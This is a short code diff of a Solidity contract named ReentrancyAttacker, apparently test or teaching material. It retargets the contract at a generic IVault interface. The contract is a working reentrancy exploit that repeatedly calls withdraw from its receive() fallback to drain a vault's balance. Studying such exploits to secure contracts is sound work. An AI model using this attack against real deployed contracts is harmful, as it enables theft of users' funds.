@@ -1,24 +1,23 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.17;
 
-import "./Vault.sol";
-import "hardhat/console.sol";
+import "./IVault.sol";
 
 contract ReentrancyAttacker {
-    Vault immutable targetContract;
+    IVault immutable targetContract;
 
     constructor(address targetContract_) {
-        targetContract = Vault(targetContract_);
+        targetContract = IVault(targetContract_);
     }
 
     function drain() external payable {
         targetContract.deposit{value: msg.value}();
-        targetContract.withdrawWithReentrancy();
+        targetContract.withdraw();
     }
 
     receive() external payable {
         if (address(targetContract).balance > 0) {
-            targetContract.withdrawWithReentrancy();
+            targetContract.withdraw();
         }
     }
 
